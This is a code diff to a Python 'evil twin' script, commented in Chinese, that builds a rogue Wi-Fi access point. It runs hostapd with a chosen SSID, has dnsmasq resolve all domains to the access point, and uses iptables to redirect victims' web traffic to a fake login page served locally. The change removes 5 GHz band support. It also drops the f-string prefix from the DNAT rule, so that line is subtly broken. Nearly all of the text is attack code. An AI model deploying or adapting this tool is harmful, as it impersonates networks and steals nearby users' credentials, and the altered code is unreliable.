@@ -24,8 +24,8 @@ def log(msg):
     formatted_msg = f"[{timestamp}] {msg}"
     print(formatted_msg)
     sys.stdout.flush()
-    # 同时写入文件供 debug (和后端读取)
-    with open(f"{TMP_DIR}/eviltwin.log", "a") as f:
+    # 同时写入文件供 debug
+    with open(f"{TMP_DIR}/debug.log", "a") as f:
         f.write(formatted_msg + "\n")
 
 
@@ -125,62 +125,43 @@ address=/#/{AP_IP}
     with open(f"{TMP_DIR}/dnsmasq.conf", "w") as f:
         f.write(conf)
 
-    run_cmd("killall dnsmasq")
     proc = subprocess.Popen(f"dnsmasq -C {TMP_DIR}/dnsmasq.conf -d", shell=True, stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
     if proc.poll() is not None:
         log("[!] Dnsmasq 启动失败")
 
 
-def start_hostapd(interface, ssid, channel, band):
-    log(f"[*] 启动 Hostapd (Band: {band} | CH: {channel} | SSID: {ssid})...")
+def start_hostapd(interface, ssid, channel):
+    log(f"[*] 启动 Hostapd (SSID: {ssid} / CH: {channel})...")
 
-    # 默认 2.4G 配置
-    hw_mode = "g"
-    ht_capab = "[HT40+][SHORT-GI-40][DSSS_CCK-40]"
-    ieee80211n = "1"
-    ieee80211ac = "0"
-
-    # 5G 配置
-    if band == "5g":
-        hw_mode = "a"
-        # 5G 通常支持 HT40+，部分网卡支持 VHT (802.11ac)
-        ht_capab = "[HT40+][SHORT-GI-40]"
-        # 尝试开启 AC 模式 (如果网卡支持)
-        ieee80211ac = "1"
-
-    # 自动信道 (ACS)
-    channel_config = f"channel={channel}"
-    if str(channel) == "0":
-        log("[*] 启用自动信道选择 (ACS)...")
-        channel_config = "channel=0\nacs_num_scans=1"
-
+    # Hostapd 配置 (最通用配置)
     conf = f"""
 interface={interface}
 driver=nl80211
 ssid={ssid}
-hw_mode={hw_mode}
-{channel_config}
-ieee80211n={ieee80211n}
-ieee80211ac={ieee80211ac}
-wmm_enabled=1
-ht_capab={ht_capab}
+hw_mode=g
+channel={channel}
 macaddr_acl=0
 auth_algs=1
 ignore_broadcast_ssid=0
-country_code=US
+wmm_enabled=0
 """
     with open(f"{TMP_DIR}/hostapd.conf", "w") as f:
         f.write(conf)
 
     # 启动 hostapd 并将日志重定向到文件以便排查
+    # 注意：这里不使用 nohup，而是直接由 Python 管理，或者输出到日志文件
+    cmd = f"hostapd {TMP_DIR}/hostapd.conf"
+
+    # 我们使用 Popen 启动，并不阻塞，但捕获输出
     with open(f"{TMP_DIR}/hostapd.log", "w") as log_file:
-        proc = subprocess.Popen(f"hostapd {TMP_DIR}/hostapd.conf", shell=True, stdout=log_file, stderr=subprocess.STDOUT)
+        proc = subprocess.Popen(cmd, shell=True, stdout=log_file, stderr=subprocess.STDOUT)
 
     # 给它一点时间启动，检查是否立即挂了
     time.sleep(2)
     if proc.poll() is not None:
         log("[!] ❌ Hostapd 启动失败！请查看 /tmp/eviltwin/hostapd.log 排查原因")
+        log("[!] 常见原因: 网卡不支持 AP 模式 / 驱动不兼容 / 之前的进程未清理干净")
     else:
         log("[+] Hostapd 正在运行...")
 
@@ -191,7 +172,7 @@ def setup_iptables(interface):
     run_cmd("iptables --flush")
     run_cmd("iptables -t nat --flush")
     run_cmd(
-        f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to-destination {AP_IP}:{WEB_PORT}")
+        "iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to-destination {AP_IP}:{WEB_PORT}")
     run_cmd("iptables -t nat -A POSTROUTING -j MASQUERADE")
 
 
@@ -201,7 +182,6 @@ def main():
     parser.add_argument("--ssid", required=True)
     parser.add_argument("--channel", default="6")
     parser.add_argument("--template", default="<h1>Login</h1>")
-    parser.add_argument("--band", default="2.4g")  # 新增 band 参数
     args = parser.parse_args()
 
     # 0. 写入模板
@@ -215,7 +195,7 @@ def main():
     # 2. 启动组件
     setup_interface(args.interface)
     start_dnsmasq(args.interface)
-    start_hostapd(args.interface, args.ssid, args.channel, args.band)
+    start_hostapd(args.interface, args.ssid, args.channel)
     setup_iptables(args.interface)
 
     # 3. 启动 Web Server
